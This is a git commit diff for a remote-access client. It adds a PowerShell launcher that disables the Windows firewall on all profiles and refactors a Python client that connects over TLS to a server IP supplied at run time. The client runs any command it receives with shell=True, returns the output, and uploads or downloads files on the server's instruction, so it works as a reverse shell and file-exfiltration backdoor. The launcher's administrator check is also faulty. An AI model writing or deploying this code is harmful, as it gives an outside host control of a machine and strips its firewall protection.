b648c5418b242830a296e452b8821ee35edf8f80
Efrain.mesia <efrain.mesia@gmail.com>
2022-07-26 11:39:37 +0300

    Client accepts arguments of serverip

---
+++ client.ps1
@@ -0,0 +1,19 @@
+ Param(
+   [Parameter(Mandatory=$true)]
+   [string]$serverip
+
+) #end param
+
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if($currentPrincipal){
+  Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+  pip install -r requirements.txt
+  $serverip_key = "--serverip=$serverip"
+  python client.py $serverip_key
+}
+else{
+  Write-Host "Please run this script as Administrator"
+}
+
+
--- client.py
+++ client.py
@@ -3,14 +3,13 @@ import socket
 import ssl
 import subprocess
 import time 
+import argparse
 
-ip_address = '127.0.0.1'
 port_number = 5555
 packet_size = 2048
 hostname = socket.gethostname()
 purpose = ssl.Purpose.SERVER_AUTH
 context = ssl.create_default_context(purpose, cafile='certificates\\ca.crt')
-
 
 
 def send_file(socket, filename):
@@ -37,39 +36,48 @@ def recv_file(socket,filename):
                 break
             out.write(bytes_read)
     out.close()
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((ip_address, port_number))
-print('Connected to host {!r} and port {}'.format(ip_address, port_number))
+
+def connect_server(ip_address):
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((ip_address, port_number))
+    print('Connected to host {!r} and port {}'.format(ip_address, port_number))
+    #wraps the socket into SSL
+    ssl_sock = context.wrap_socket(client_socket, server_hostname='localhost')
+    ssl_sock.send(hostname.encode())
+    return ssl_sock
 
 
-ssl_sock = context.wrap_socket(client_socket, server_hostname='localhost')
+def init_argparse():
+  parser = argparse.ArgumentParser()
+  parser.add_argument("-s", "--serverip", required=True,
+                      help="Enter consul key after client, e.g. 'aws_mini_prod1/input'")
+  return parser
 
-#ssl_sock.connect((ip_address,port_number))
-#pprint.pprint(ssl_sock.getpeercert())
-ssl_sock.send(hostname.encode())
 
-
-cmd = ssl_sock.recv(packet_size).decode().split(" ")
-
-while cmd!=['bye']:
-    print(cmd)
-    if(cmd[0] =='download'):
-        file_name = cmd[-1]
-        recv_file(ssl_sock,file_name)
-        ssl_sock.send("Download file finished successfully")
-
-    elif(cmd[0] =='upload'):
-        send_file(ssl_sock,cmd[1])
-
-    else:
-        p =subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
-        output,error = p.communicate()
-        msg = str(output.decode())
-        if not msg:
-            msg =str(error.decode())
-        ssl_sock.send(msg.encode())
+if __name__=='__main__':
+    parser = init_argparse()
+    args = parser.parse_args()
+    print(f"Trying to connect to {args.serverip} on port {port_number}")
+    ssl_socket = connect_server(args.serverip)
+    cmd = ssl_socket.recv(packet_size).decode().split(" ")
+    while cmd!=['bye']:
         print(cmd)
-        print('waiting for input from SRV')
-    cmd = list(ssl_sock.recv(packet_size).decode().split(" "))
+        if(cmd[0] =='download'):
+            file_name = cmd[-1]
+            recv_file(ssl_socket,file_name)
+            ssl_socket.send("Download file finished successfully")
 
-ssl_sock.close()
+        elif(cmd[0] =='upload'):
+            send_file(ssl_socket,cmd[1])
+
+        else:
+            p =subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
+            output,error = p.communicate()
+            msg = str(output.decode())
+            if not msg:
+                msg =str(error.decode())
+            ssl_socket.send(msg.encode())
+            print(cmd)
+            print('waiting for input from SRV')
+        cmd = list(ssl_socket.recv(packet_size).decode().split(" "))
+    ssl_socket.close()
